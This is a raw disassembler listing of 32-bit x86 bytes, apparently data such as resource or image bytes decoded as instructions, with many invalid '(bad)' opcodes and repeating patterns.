1101533b:	inc    DWORD PTR [eax]
1101533d:	add    BYTE PTR [eax],al
1101533f:	loopne 0x11015341
11015341:	add    BYTE PTR [eax],al
11015343:	mov    eax,ds:0x52000000
11015348:	add    BYTE PTR [eax],al
1101534a:	add    BYTE PTR [eax+eax*1],bl
1101534d:	add    BYTE PTR [eax],al
1101534f:	add    eax,0x12000000
11015354:	add    BYTE PTR [eax],al
11015356:	add    BYTE PTR [eax],dh
11015358:	add    BYTE PTR [eax],al
1101535a:	add    BYTE PTR [eax+0x0],ah
1101535d:	add    BYTE PTR [eax],al
1101535f:	cdq    
11015360:	add    BYTE PTR [eax],al
11015362:	add    dl,dl
11015364:	add    BYTE PTR [eax],al
11015366:	add    bh,bh
11015368:	push   0xfbff6868
1101536d:	sti    
1101536e:	sti    
1101536f:	(bad)  
11015370:	std    
11015371:	std    
11015372:	std    
11015373:	(bad)  
11015374:	std    
11015375:	std    
11015376:	std    
11015377:	(bad)  
11015378:	std    
11015379:	sti    
1101537a:	stc    
1101537b:	push   ebp
1101537d:	pushf  
1101537e:	jae    0x1101537f
11015380:	repz mov fs,WORD PTR [eax-0x1]
11015384:	hlt    
11015385:	(bad)  
11015386:	popa   
11015387:	push   esp
11015389:	(bad)  
1101538a:	arpl   di,di
1101538c:	repz (bad) 
1101538e:	(bad)  
1101538f:	push   eax
11015391:	mov    ebx,DWORD PTR [edi-0x1]
11015394:	in     eax,dx
11015395:	xchg   DWORD PTR [ebx-0x1],ebx
11015398:	jmp    0x527d:0xe7ff5782
1101539f:	jmp    esp
110153a1:	js     0x110153f1
110153a3:	jmp    eax
110153a5:	jae    0x110153f1
110153a7:	(bad)  
110153a8:	(bad)  [edi+0x45]
110153ab:	(bad)  
110153ac:	fisubr DWORD PTR [edx+0x41]
110153af:	call   esi
110153b1:	gs cmp eax,0x3960d3ff
110153b7:	dec    edi
110153b9:	pop    ebx
110153ba:	ss dec esp
110153bd:	push   edi
110153be:	xor    edi,edi
110153c0:	shr    BYTE PTR [ecx+0x49],1
110153c3:	(bad)  
110153c4:	cld    
110153c5:	stc    
110153c6:	idiv   edi
110153c8:	std    
110153c9:	std    
110153ca:	std    
110153cb:	(bad)  
110153cc:	(bad)  
110153cd:	(bad)  
110153ce:	std    
110153cf:	(bad)  
110153d0:	sti    
110153d1:	sti    
110153d2:	sti    
110153d3:	jmp    DWORD PTR [ebp+0x65]
110153d6:	inc    DWORD PTR gs:[eax]
110153d9:	add    BYTE PTR [eax],al
110153db:	inc    DWORD PTR [eax]
110153dd:	add    BYTE PTR [eax],al
110153df:	lock add BYTE PTR [eax],al
110153e2:	add    dl,al
110153e4:	add    BYTE PTR [eax],al
110153e6:	add    BYTE PTR [ecx+0x0],bh
110153e9:	add    BYTE PTR [eax],al
110153eb:	cmp    BYTE PTR [eax],al
110153ed:	add    BYTE PTR [eax],al
110153ef:	adc    eax,DWORD PTR [eax]
110153f1:	add    BYTE PTR [eax],al
110153f3:	sub    al,BYTE PTR [eax]
110153f5:	add    BYTE PTR [eax],al
110153f7:	pop    edx
110153f8:	add    BYTE PTR [eax],al
110153fa:	add    BYTE PTR [ebp-0x31000000],dl
11015400:	add    BYTE PTR [eax],al
11015402:	add    ah,bh
11015404:	push   0xfbff6868
11015409:	sti    
1101540a:	sti    
1101540b:	(bad)  
1101540c:	(bad)  
1101540d:	(bad)  
1101540e:	(bad)  
1101540f:	(bad)  
11015410:	(bad)  
11015411:	(bad)  
11015412:	(bad)  
11015413:	(bad)  
11015414:	(bad)  
11015415:	(bad)  
11015416:	std    
11015417:	(bad)  
11015418:	sti    
11015419:	fmul   st,st(0)
1101541b:	push   esp
1101541d:	(bad)  
1101541e:	popa   
1101541f:	push   esp
11015421:	xchg   ecx,eax
11015422:	fs push esp
11015425:	xchg   edx,eax
11015426:	push   sp
11015429:	xchg   ebx,eax
1101542a:	addr16 push esp
1101542d:	xchg   ebx,eax
1101542e:	push   0x6692f3ff
11015433:	push   eax
11015435:	lea    esp,[edx-0x1]
11015438:	in     eax,dx
11015439:	mov    BYTE PTR [ebp-0x1],bl
1101543c:	jmp    0x537e:0xe7ff5883
11015443:	jmp    ebx
11015445:	js     0x11015495
11015447:	jmp    eax
11015449:	jae    0x11015495
1101544b:	(bad)  
1101544c:	(bad)  [esi+0x45]
1101544f:	(bad)  
11015450:	fisubr DWORD PTR [edx+0x41]
11015453:	call   esi
11015455:	gs cmp eax,0x3960d3ff
1101545b:	dec    edi
1101545d:	pop    ebx
1101545e:	xor    eax,0x3157ccff
11015463:	(bad)  
11015464:	in     eax,dx
11015465:	lds    edi,FWORD PTR [eax-0x2020201]
1101546b:	(bad)  
1101546c:	(bad)  
1101546d:	(bad)  
1101546e:	(bad)  
1101546f:	(bad)  
11015470:	(bad)  
11015471:	(bad)  
11015472:	std    
11015473:	(bad)  
11015474:	sti    
11015475:	sti    
11015476:	cli    
11015477:	jmp    DWORD PTR [ebp+0x65]
1101547a:	inc    DWORD PTR gs:[eax]
1101547d:	add    BYTE PTR [eax],al
1101547f:	inc    BYTE PTR [eax]
11015481:	add    BYTE PTR [eax],al
11015483:	loope  0x11015485
11015485:	add    BYTE PTR [eax],al
11015487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11015488:	add    BYTE PTR [eax],al
1101548a:	add    BYTE PTR [eax+0x0],ah
1101548d:	add    BYTE PTR [eax],al
1101548f:	sub    al,BYTE PTR [eax]
11015491:	add    BYTE PTR [eax],al
11015493:	inc    edx
11015494:	add    BYTE PTR [eax],al
11015496:	add    BYTE PTR [ecx-0x39000000],al
1101549c:	add    BYTE PTR [eax],al
1101549e:	add    ah,bh
110154a0:	addr16 addr16 addr16 (bad) 
110154a4:	sti    
110154a5:	sti    
110154a6:	sti    
110154a7:	(bad)  
110154a8:	(bad)  
110154a9:	(bad)  
110154aa:	(bad)  
110154ab:	(bad)  
110154ac:	(bad)  
110154ad:	(bad)  
110154ae:	(bad)  
110154af:	(bad)  
110154b0:	(bad)  
110154b1:	(bad)  
110154b2:	(bad)  
110154b3:	(bad)  
110154b4:	(bad)  
110154b5:	(bad)  
110154b6:	(bad)  
110154b7:	(bad)  
110154b8:	clc    
110154b9:	mov    dh,0x98
110154bb:	push   esp
110154bd:	xchg   edx,eax
110154be:	gs push esp
110154c1:	xchg   ebp,eax
110154c2:	push   0xffffffff
110154c4:	hlt    
110154c5:	xchg   edi,eax
110154c6:	ins    DWORD PTR es:[edi],dx
110154c7:	push   esp
110154c9:	cwde   
110154ca:	outs   dx,BYTE PTR ds:[esi]
110154cb:	push   ebp
110154cd:	cwde   
110154ce:	outs   dx,BYTE PTR ds:[esi]
110154cf:	push   esp
110154d1:	xchg   edi,eax
110154d2:	ins    DWORD PTR es:[edi],dx
110154d3:	push   ebx
110154d5:	xchg   esp,eax
110154d6:	push   0xffffffff
110154d8:	lock (bad) 
110154da:	gs (bad) 
110154dc:	in     eax,dx
110154dd:	mov    bl,BYTE PTR [edi-0x1]
110154e0:	jmp    0x547e:0xe7ff5984
110154e7:	jmp    ebx
110154e9:	jns    0x11015539
110154eb:	jmp    eax
110154ed:	jae    0x11015539
110154ef:	(bad)  
110154f0:	(bad)  [edi+0x45]
110154f3:	(bad)  
110154f4:	fisubr DWORD PTR [ecx+0x41]
110154f7:	call   esi
110154f9:	gs cmp eax,0x395fd2ff
110154ff:	dec    edi
11015501:	pop    ebx
11015502:	xor    eax,0x7992dfff
11015507:	(bad)  
11015508:	(bad)  
11015509:	(bad)  
1101550a:	std    
1101550b:	(bad)  
1101550c:	(bad)  
1101550d:	(bad)  
1101550e:	(bad)  
1101550f:	(bad)  
11015510:	(bad)  
11015511:	(bad)  
11015512:	(bad)  
11015513:	(bad)  
11015514:	(bad)  
11015515:	(bad)  
11015516:	(bad)  
11015517:	(bad)  
11015518:	sti    
11015519:	sti    
1101551a:	sti    
1101551b:	jmp    DWORD PTR [ebp+0x65]
1101551e:	inc    DWORD PTR gs:[eax]
11015521:	add    BYTE PTR [eax],al
11015523:	std    
11015524:	add    BYTE PTR [eax],al
11015526:	add    dh,cl
11015528:	add    BYTE PTR [eax],al
1101552a:	add    BYTE PTR [ebp+0x42000000],al
11015530:	add    BYTE PTR [eax],al
11015532:	add    BYTE PTR [eax+0x0],cl
11015535:	add    BYTE PTR [eax],al
11015537:	mov    al,ds:0xfa000000
1101553c:	push   0xfbff6868
11015541:	sti    
11015542:	sti    
11015543:	(bad)  
11015544:	(bad)  
11015545:	(bad)  
11015546:	(bad)  
11015547:	(bad)  
11015548:	(bad)  
11015549:	(bad)  
1101554a:	std    
1101554b:	(bad)  
1101554c:	(bad)  
1101554d:	(bad)  
1101554e:	(bad)  
1101554f:	(bad)  
11015550:	(bad)  
11015551:	(bad)  
11015552:	(bad)  
11015553:	(bad)  
11015554:	(bad)  
11015555:	(bad)  
11015556:	(bad)  
11015557:	push   esi
11015559:	mov    ds:0x96f4ff7c,al
1101555e:	ins    BYTE PTR es:[edi],dx
1101555f:	push   ebp
11015561:	fwait
11015562:	jb     0x11015563
11015564:	cmc    
11015565:	popf   
11015566:	jne    0x11015567
11015568:	cmc    
11015569:	sahf   
1101556a:	ja     0x1101556b
1101556c:	cmc    
1101556d:	sahf   
1101556e:	ja     0x1101556f
11015570:	cmc    
11015571:	popf   
11015572:	jne    0x11015573
11015574:	cmc    
11015575:	fwait
11015576:	jb     0x11015577
11015578:	hlt    
11015579:	xchg   edi,eax
1101557a:	outs   dx,BYTE PTR ds:[esi]
1101557b:	push   ecx
1101557d:	xchg   ecx,eax
1101557e:	addr16 (bad) 
11015580:	out    dx,al
11015581:	mov    esp,DWORD PTR [eax-0x1]
11015584:	jmp    0x547e:0xe7ff5a84
1101558b:	jmp    ebx
1101558d:	jns    0x110155de
1101558f:	jmp    eax
11015591:	jae    0x110155dd
11015593:	(bad)  
11015594:	(bad)  [esi+0x45]
11015597:	(bad)  
11015598:	fisubr DWORD PTR [ecx+0x41]
1101559b:	call   esi
1101559d:	fs cmp al,0xff
110155a0:	rcr    BYTE PTR [edi+0x38],cl
110155a3:	call   edi
110155a5:	jae    0x110155f9
110155a7:	(bad)  
110155a8:	std    
110155a9:	std    
110155aa:	std    
110155ab:	(bad)  
110155ac:	(bad)  
110155ad:	(bad)  
110155ae:	(bad)  
110155af:	(bad)  
110155b0:	(bad)  
110155b1:	(bad)  
110155b2:	(bad)  
110155b3:	(bad)  
110155b4:	(bad)  
110155b5:	(bad)  
110155b6:	(bad)  
110155b7:	(bad)  
110155b8:	std    
110155b9:	std    
110155ba:	std    
110155bb:	(bad)  
110155bc:	sti    
110155bd:	sti    
110155be:	sti    
110155bf:	jmp    DWORD PTR [ebp+0x65]
110155c2:	inc    DWORD PTR gs:[eax]
110155c5:	add    BYTE PTR [eax],al
110155c7:	sti    
110155c8:	add    BYTE PTR [eax],al
110155ca:	add    BYTE PTR [ebx+0x48000000],ah
110155d0:	add    BYTE PTR [eax],al
110155d2:	add    BYTE PTR [ecx+0x0],ah
110155d5:	add    BYTE PTR [eax],al
110155d7:	hlt    
110155d8:	addr16 addr16 addr16 (bad) 
110155dc:	sti    
110155dd:	sti    
110155de:	sti    
110155df:	(bad)  
110155e0:	(bad)  
110155e1:	(bad)  
110155e2:	(bad)  
110155e3:	(bad)  
110155e4:	std    
110155e5:	std    
110155e6:	std    
110155e7:	(bad)  
110155e8:	std    
110155e9:	std    
110155ea:	std    
110155eb:	(bad)  
110155ec:	std    
110155ed:	std    
110155ee:	std    
110155ef:	(bad)  
110155f0:	(bad)  
110155f1:	(bad)  
110155f2:	std    
110155f3:	(bad)  
110155f4:	std    
110155f5:	std    
110155f6:	std    
110155f7:	push   ebp
110155f9:	call   0xff74:0x9cf5ff72
11015600:	cmc    
11015601:	mov    ds:0xa5f6ff7c,al
11015606:	cmp    bh,0xf6
11015609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
1101560a:	cmp    bh,0xf6
1101560d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
1101560e:	cmp    bh,0xf6
11015611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11015612:	jg     0x11015613
11015614:	cmc    
11015615:	mov    eax,ds:0x9df5ff7b
1101561a:	jbe    0x1101561b
1101561c:	hlt    
1101561d:	cdq    
1101561e:	outs   dx,DWORD PTR ds:[esi]
1101561f:	push   ecx
11015621:	xchg   edx,eax
11015622:	push   0x608bedff
11015627:	(bad)  
11015628:	jmp    0xf900afb1
1101562d:	jle    0x11015682
1101562f:	jmp    ebx
11015631:	js     0x11015681
11015633:	jmp    eax
11015635:	jae    0x11015680
11015637:	(bad)  
11015638:	(bad)  [esi+0x45]
1101563b:	(bad)  
1101563c:	fldcw  WORD PTR [ecx+0x40]
1101563f:	call   ebp
11015641:	fs cmp al,0xff
11015644:	aad    0x67
11015646:	inc    ecx
11015647:	(bad)  
11015648:	std    
11015649:	std    
1101564a:	std    
1101564b:	(bad)  
1101564c:	(bad)  
1101564d:	(bad)  
1101564e:	std    
1101564f:	(bad)  
11015650:	std    
11015651:	std    
11015652:	std    
11015653:	(bad)  
11015654:	std    
11015655:	std    
11015656:	std    
11015657:	(bad)  
11015658:	std    
11015659:	std    
1101565a:	std    
1101565b:	(bad)  
1101565c:	std    
1101565d:	std    
1101565e:	std    
1101565f:	(bad)  
11015660:	cli    
11015661:	cli    
11015662:	cli    
11015663:	jmp    DWORD PTR [ebp+0x65]
11015666:	inc    DWORD PTR gs:[eax]
11015669:	add    BYTE PTR [eax],al
1101566b:	hlt    
1101566c:	add    BYTE PTR [eax],al
1101566e:	add    BYTE PTR [ecx+0x0],ah
11015671:	add    BYTE PTR [eax],al
11015673:	dec    esp
11015674:	add    BYTE PTR [eax],al
11015676:	add    cl,dh
11015678:	push   0xfbfe6868
1101567d:	sti    
1101567e:	sti    
1101567f:	(bad)  
11015680:	(bad)  
11015681:	(bad)  
11015682:	(bad)  
11015683:	(bad)  
11015684:	(bad)  
11015685:	(bad)  
11015686:	(bad)  
11015687:	(bad)  
11015688:	(bad)  
11015689:	(bad)  
1101568a:	std    
1101568b:	(bad)  
1101568c:	(bad)  
1101568d:	(bad)  
1101568e:	(bad)  
1101568f:	(bad)  
11015690:	(bad)  
11015691:	(bad)  
11015692:	(bad)  
11015693:	(bad)  
11015694:	(bad)  
11015695:	(bad)  
11015696:	std    
11015697:	push   esi
11015699:	lahf   
1101569a:	js     0x1101569b
1101569c:	mul    BYTE PTR [ebx-0x54090083]
110156a2:	mov    bh,bh
110156a4:	imul   DWORD PTR [edi-0x4e080071]
110156aa:	xchg   ecx,eax
110156ab:	push   edi
110156ad:	mov    cl,0x91
110156af:	push   edi
110156b1:	scas   al,BYTE PTR es:[edi]
110156b2:	mov    edi,?
110156b4:	imul   BYTE PTR [ecx-0x5b09007a]
110156ba:	jg     0x110156bb
110156bc:	cmc    
110156bd:	lahf   
110156be:	ja     0x110156bf
110156c0:	hlt    
110156c1:	cdq    
110156c2:	jo     0x110156c3
110156c4:	icebp  
110156c5:	xchg   ecx,eax
110156c6:	addr16 (bad) 
110156c8:	in     eax,dx
110156c9:	mov    bl,BYTE PTR [edi-0x1]
110156cc:	jmp    0x527d:0xe7ff5883
110156d3:	jmp    esp
110156d5:	js     0x11015724
110156d7:	jmp    ecx
110156d9:	jb     0x11015724
110156db:	(bad)  
110156dc:	(bad)  [ebp+0x44]
110156df:	(bad)  
110156e0:	fldcw  WORD PTR [eax+0x3f]
110156e3:	(bad)  
110156e4:	fsubr  DWORD PTR [ebx+0x44]
110156e7:	(bad)  
110156e8:	std    
110156e9:	std    
110156ea:	std    
110156eb:	(bad)  
110156ec:	(bad)  
110156ed:	(bad)  
110156ee:	std    
110156ef:	(bad)  
110156f0:	(bad)  
110156f1:	(bad)  
110156f2:	std    
110156f3:	(bad)  
110156f4:	(bad)  
110156f5:	(bad)  
110156f6:	(bad)  
110156f7:	(bad)  
110156f8:	std    
110156f9:	std    
110156fa:	std    
110156fb:	(bad)  
110156fc:	(bad)  
110156fd:	(bad)  
110156fe:	(bad)  
110156ff:	(bad)  
11015700:	sti    
11015701:	sti    
11015702:	sti    
11015703:	jmp    DWORD PTR [edi+0x67]
11015706:	inc    BYTE PTR [bx+si]
11015709:	add    BYTE PTR [eax],al
1101570b:	lock add BYTE PTR [eax],al
1101570e:	add    BYTE PTR [ebx+0x0],cl
11015711:	add    BYTE PTR [eax],al
11015713:	or     al,BYTE PTR [eax]
11015715:	add    BYTE PTR [eax],al
11015717:	dec    esi
11015718:	add    BYTE PTR [eax],al
1101571a:	add    cl,dh
1101571c:	imul   ebp,DWORD PTR [ecx+0x69],0xfbfbfbfe
11015723:	(bad)  
11015724:	std    
11015725:	std    
11015726:	std    
11015727:	(bad)  
11015728:	std    
11015729:	std    
1101572a:	std    
1101572b:	(bad)  
1101572c:	(bad)  
1101572d:	(bad)  
1101572e:	(bad)  
1101572f:	(bad)  
11015730:	(bad)  
11015731:	(bad)  
11015732:	std    
11015733:	(bad)  
11015734:	std    
11015735:	std    
11015736:	std    
11015737:	push   edi
11015739:	lods   eax,DWORD PTR ds:[esi]
1101573a:	mov    edi,?
1101573c:	imul   BYTE PTR [edx-0x4b080079]
11015742:	xchg   esi,eax
11015743:	(bad)  
11015744:	clc    
11015745:	mov    edx,0xbdf8ff9f
1101574a:	mov    ds:0xa1bcf8ff,al
1101574f:	push   edi
11015751:	mov    eax,0xb2f7ff9b
11015756:	xchg   ebx,eax
11015757:	push   esi
11015759:	stos   DWORD PTR es:[edi],eax
1101575a:	mov    edi,edi
1101575c:	mul    BYTE PTR [esi+edi*2+0x759df5ff]
11015763:	push   esp
11015765:	xchg   edi,eax
11015766:	ins    DWORD PTR es:[edi],dx
11015767:	push   eax
11015769:	(bad)  
1101576a:	fs (bad) 
1101576c:	in     eax,dx
1101576d:	mov    BYTE PTR [ebp-0x1],bl
11015770:	jmp    0x517c:0xe7ff5782
11015777:	jmp    ebx
11015779:	ja     0x110157c7
1101577b:	(bad)  
1101577c:	fbstp  TBYTE PTR [ecx+0x47]
1101577f:	(bad)  
11015780:	fsubr  QWORD PTR [edx+eax*2-0x1]
11015784:	fistp  QWORD PTR [esi+0x5a]
11015787:	(bad)  
11015788:	std    
11015789:	std    
1101578a:	std    
1101578b:	(bad)  
1101578c:	(bad)  
1101578d:	(bad)  
1101578e:	std    
1101578f:	(bad)  
11015790:	(bad)  
11015791:	(bad)  
11015792:	std    
11015793:	(bad)  
11015794:	(bad)  
11015795:	(bad)  
11015796:	std    
11015797:	(bad)  
11015798:	std    
11015799:	std    
1101579a:	std    
1101579b:	(bad)  
1101579c:	sti    
1101579d:	sti    
1101579e:	sti    
1101579f:	jmp    FWORD PTR [eax+0x68]
110157a2:	push   0xfe
110157a7:	repnz add BYTE PTR [eax],al
110157aa:	add    BYTE PTR [edx+0x0],dl
110157ad:	add    BYTE PTR [eax],al
110157af:	or     eax,DWORD PTR [eax]
110157b1:	add    BYTE PTR [eax],al
110157b3:	add    al,BYTE PTR [eax]
110157b5:	add    BYTE PTR [eax],al
110157b7:	or     al,BYTE PTR [eax]
110157b9:	add    BYTE PTR [eax],al
110157bb:	dec    esi
110157bc:	add    BYTE PTR [eax],al
110157be:	add    cl,dh
110157c0:	push   0xfcfe6868
110157c5:	cld    
110157c6:	cld    
110157c7:	(bad)  
110157c8:	std    
110157c9:	std    
110157ca:	std    
110157cb:	(bad)  
110157cc:	(bad)  
110157cd:	(bad)  
110157ce:	(bad)  
110157cf:	(bad)  
110157d0:	(bad)  
110157d1:	(bad)  
110157d2:	std    
110157d3:	(bad)  
110157d4:	(bad)  
110157d5:	(bad)  
110157d6:	std    
110157d7:	(bad)  
110157d8:	stc    
110157d9:	les    ebp,FWORD PTR [edi+edi*8-0x6f4f09]
110157e0:	clc    
110157e1:	mov    esi,0xc6f9ffa3
110157e6:	scas   eax,DWORD PTR es:[edi]
110157e7:	(bad)  
110157e8:	stc    
110157e9:	leave  
110157ea:	mov    ah,0xff
110157ec:	stc    
110157ed:	enter  0xffb2,0xf8
110157f1:	ret    
110157f2:	stos   DWORD PTR es:[edi],eax
110157f3:	(bad)  
110157f4:	clc    
110157f5:	mov    ebx,0xb2f7ffa0
110157fa:	xchg   ebx,eax
110157fb:	push   esi
110157fd:	test   eax,0xa1f5ff86
11015802:	jnp    0x11015803
11015804:	cmc    
11015805:	call   0xff69:0x94f3ff71
1101580c:	lock lea esp,[ecx-0x1]
11015810:	in     eax,dx
11015811:	xchg   DWORD PTR [ebx-0x1],ebx
11015814:	jmp    0x4f7b:0xe7ff5580
1101581b:	jmp    edx
1101581d:	jne    0x11015869
1101581f:	(bad)  
11015820:	fbstp  TBYTE PTR [eax+0x45]
11015823:	(bad)  
11015824:	jmp    0xf00dcc8
11015829:	std    
1101582a:	std    
1101582b:	(bad)  
1101582c:	(bad)  
1101582d:	(bad)  
1101582e:	std    
1101582f:	(bad)  
11015830:	(bad)  
11015831:	(bad)  
11015832:	std    
11015833:	(bad)  
11015834:	(bad)  
11015835:	(bad)  
11015836:	(bad)  
11015837:	(bad)  
11015838:	sti    
11015839:	sti    
1101583a:	sti    
1101583b:	jmp    DWORD PTR [edi+0x67]
1101583e:	inc    DWORD PTR [bx+si]
11015841:	add    BYTE PTR [eax],al
11015843:	cmc    
11015844:	add    BYTE PTR [eax],al
11015846:	add    BYTE PTR [edi+0x0],ah
11015849:	add    BYTE PTR [eax],al
1101584b:	adc    eax,DWORD PTR [eax]
1101584d:	add    BYTE PTR [eax],al
1101584f:	add    eax,DWORD PTR [eax]
11015851:	add    BYTE PTR [eax],al
11015853:	add    BYTE PTR [eax],al
11015855:	add    BYTE PTR [eax],al
11015857:	add    al,BYTE PTR [eax]
11015859:	add    BYTE PTR [eax],al
1101585b:	or     al,BYTE PTR [eax]
1101585d:	add    BYTE PTR [eax],al
1101585f:	push   eax
11015860:	add    BYTE PTR [eax],al
11015862:	add    cl,dh
11015864:	imul   ebp,DWORD PTR [ecx+0x69],0xfbfbfbff
1101586b:	(bad)  
1101586c:	(bad)  
1101586d:	(bad)  
1101586e:	std    
1101586f:	(bad)  
11015870:	(bad)  
11015871:	(bad)  
11015872:	(bad)  
11015873:	(bad)  
11015874:	(bad)  
11015875:	(bad)  
11015876:	std    
11015877:	(bad)  
11015878:	cld    
11015879:	loop   0x11015851
1101587b:	push   edi
1101587d:	mov    ch,0x97
1101587f:	(bad)  
11015880:	stc    
11015881:	lds    ebp,FWORD PTR [esi-0x412f0501]
11015887:	(bad)  
11015888:	cli    
11015889:	aad    0xc4
1101588b:	(bad)  
1101588c:	cli    
1101588d:	rol    ecx,cl
1101588f:	(bad)  
11015890:	stc    
11015891:	int    0xb8
11015893:	(bad)  
11015894:	clc    
11015895:	ret    
11015896:	stos   DWORD PTR es:[edi],eax
11015897:	(bad)  
11015898:	clc    
11015899:	mov    eax,0xaef7ff9c
1101589e:	(bad)  
1101589f:	push   esi
110158a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110158a2:	jg     0x110158a3
110158a4:	cmc    
110158a5:	popf   
110158a6:	je     0x110158a7
110158a8:	hlt    
110158a9:	xchg   edi,eax
110158aa:	ins    BYTE PTR es:[edi],dx
110158ab:	push   ebx
110158ad:	xchg   edx,eax
110158ae:	push   ax
110158b1:	mov    ebx,DWORD PTR [edi-0x1]
110158b4:	in     eax,dx
110158b5:	test   DWORD PTR [eax-0x1],ebx
110158b8:	jmp    0x4e7a:0xe6ff537f
110158bf:	jmp    edx
110158c1:	je     0x1101590b
110158c3:	push   esp
110158c5:	iret   
110158c6:	sar    bh,0xfd
110158c9:	std    
110158ca:	std    
110158cb:	(bad)  
110158cc:	(bad)  
110158cd:	(bad)  
110158ce:	(bad)  
110158cf:	(bad)  
110158d0:	(bad)  
110158d1:	(bad)  
110158d2:	std    
110158d3:	(bad)  
110158d4:	sti    
110158d5:	sti    
110158d6:	sti    
110158d7:	jmp    FWORD PTR [eax+0x68]
110158da:	push   0xff
110158df:	stc    
110158e0:	add    BYTE PTR [eax],al
110158e2:	add    BYTE PTR [ebx+0x32000000],dl
110158e8:	add    BYTE PTR [eax],al
110158ea:	add    BYTE PTR [eax+eax*1],cl
110158ed:	add    BYTE PTR [eax],al
110158ef:	add    DWORD PTR [eax],eax
	...
110158f9:	add    BYTE PTR [eax],al
110158fb:	add    al,BYTE PTR [eax]
110158fd:	add    BYTE PTR [eax],al
110158ff:	push   cs
11015900:	add    BYTE PTR [eax],al
11015902:	add    BYTE PTR [ebx+0x0],bl
11015905:	add    BYTE PTR [eax],al
11015907:	jmp    FWORD PTR [ecx+0x69]
1101590a:	imul   edi,edi,0xfffcfcfc
11015910:	(bad)  
11015911:	(bad)  
11015912:	std    
11015913:	(bad)  
11015914:	(bad)  
11015915:	(bad)  
11015916:	std    
11015917:	(bad)  
11015918:	std    
11015919:	sti    
1101591a:	cli    
1101591b:	(bad)  
1101591c:	stc    
1101591d:	shl    DWORD PTR [edi-0x4e380601],0xff
11015924:	cli    
11015925:	(bad)  
11015926:	(bad)  
11015929:	fmul   st(6),st
1101592b:	(bad)  
1101592c:	sti    
1101592d:	fcmove st,st(4)
1101592f:	(bad)  
11015930:	cli    
11015931:	rol    ecx,cl
11015933:	(bad)  
11015934:	stc    
11015935:	enter  0xffb2,0xf9
11015939:	mov    ebp,0xb1f7ffa2
1101593e:	xchg   ecx,eax
1101593f:	push   esi
11015941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11015942:	cmp    bh,0xf6
11015945:	sahf   
11015946:	ja     0x11015947
11015948:	cmc    
11015949:	cwde   
1101594a:	outs   dx,BYTE PTR ds:[esi]
1101594b:	push   esp
1101594d:	xchg   ebx,eax
1101594e:	push   0x638ff3ff
11015953:	push   eax
11015955:	mov    DWORD PTR [edi+edi*8-0x14],ebx
11015959:	adc    DWORD PTR [esi-0x1],0xffffffe9
1101595d:	jle    0x110159b0
1101595f:	(bad)  
11015960:	jmp    0xf00bcef
11015965:	cli    
11015966:	clc    
11015967:	(bad)  
11015968:	std    
11015969:	std    
1101596a:	std    
1101596b:	(bad)  
1101596c:	(bad)  
1101596d:	(bad)  
1101596e:	std    
1101596f:	(bad)  
11015970:	sti    
11015971:	sti    
11015972:	sti    
11015973:	jmp    FWORD PTR [eax+0x68]
11015976:	push   0xff
1101597b:	inc    DWORD PTR [eax]
1101597d:	add    BYTE PTR [eax],al
1101597f:	leave  
11015980:	add    BYTE PTR [eax],al
11015982:	add    BYTE PTR [ecx+0x0],dh
11015985:	add    BYTE PTR [eax],al
11015987:	sub    eax,DWORD PTR [eax]
11015989:	add    BYTE PTR [eax],al
1101598b:	or     al,BYTE PTR [eax]
1101598d:	add    BYTE PTR [eax],al
1101598f:	add    DWORD PTR [eax],eax
	...
1101599d:	add    BYTE PTR [eax],al
1101599f:	add    eax,0x1f000000
110159a4:	add    BYTE PTR [eax],al
110159a6:	add    bh,bh
110159a8:	add    DWORD PTR [eax],eax
110159aa:	add    bh,bh
110159ac:	push   0xfbff6868
110159b1:	sti    
110159b2:	sti    
110159b3:	(bad)  
110159b4:	(bad)  
110159b5:	(bad)  
110159b6:	std    
110159b7:	(bad)  
110159b8:	(bad)  
110159b9:	(bad)  
110159ba:	(bad)  
110159bb:	(bad)  
110159bc:	cld    
110159bd:	call   0xd5fb59a1
110159c2:	lods   eax,DWORD PTR ds:[esi]
110159c3:	(bad)  
110159c4:	cli    
110159c5:	rol    edx,cl
110159c7:	(bad)  
110159c8:	sti    
110159c9:	fmul   st(6),st
110159cb:	(bad)  
110159cc:	sti    
110159cd:	fmul   st(6),st
110159cf:	(bad)  
110159d0:	cli    
110159d1:	aad    0xc4
110159d3:	(bad)  
110159d4:	stc    
110159d5:	retf   0xffb4
110159d8:	clc    
110159d9:	mov    ebp,0xb1f7ffa3
110159de:	xchg   ecx,eax
110159df:	push   esi
110159e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
110159e2:	cmp    edi,0xfffffff5
110159e5:	sahf   
110159e6:	ja     0x110159e7
110159e8:	cmc    
110159e9:	cwde   
110159ea:	outs   dx,BYTE PTR ds:[esi]
110159eb:	push   esp
110159ed:	xchg   ebx,eax
110159ee:	addr16 push esp
110159f1:	nop
110159f2:	arpl   di,di
110159f4:	repnz lea ebx,[esi-0x1]
110159f8:	out    dx,eax
110159f9:	xchg   DWORD PTR [ecx-0x1],ebx
110159fc:	in     al,dx
110159fd:	adc    BYTE PTR [edi+edi*8-0x8],0xd5
11015a02:	(bad)  
11015a03:	(bad)  
11015a04:	(bad)  
11015a05:	(bad)  
11015a06:	std    
11015a07:	(bad)  
11015a08:	(bad)  
11015a09:	(bad)  
11015a0a:	std    
11015a0b:	(bad)  
11015a0c:	sti    
11015a0d:	sti    
11015a0e:	sti    
11015a0f:	jmp    DWORD PTR [edi+0x67]
11015a12:	inc    DWORD PTR [bx+di]
11015a15:	add    DWORD PTR [eax],eax
11015a17:	inc    DWORD PTR [eax]
11015a19:	add    BYTE PTR [eax],al
11015a1b:	inc    DWORD PTR [eax]
11015a1d:	add    BYTE PTR [eax],al
11015a1f:	mov    edx,0x6d000000
11015a24:	add    BYTE PTR [eax],al
11015a26:	add    BYTE PTR [edx],ch
11015a28:	add    BYTE PTR [eax],al
11015a2a:	add    BYTE PTR [edx],cl
11015a2c:	add    BYTE PTR [eax],al
11015a2e:	add    BYTE PTR [ecx],al
	...
11015a3c:	add    BYTE PTR [eax],al
11015a3e:	add    BYTE PTR [ebx],al
11015a40:	add    BYTE PTR [eax],al
11015a42:	add    BYTE PTR [edi],dl
11015a44:	add    BYTE PTR [eax],al
11015a46:	add    bh,bh
11015a48:	jno    0x11015a89
11015a4a:	sub    edi,edi
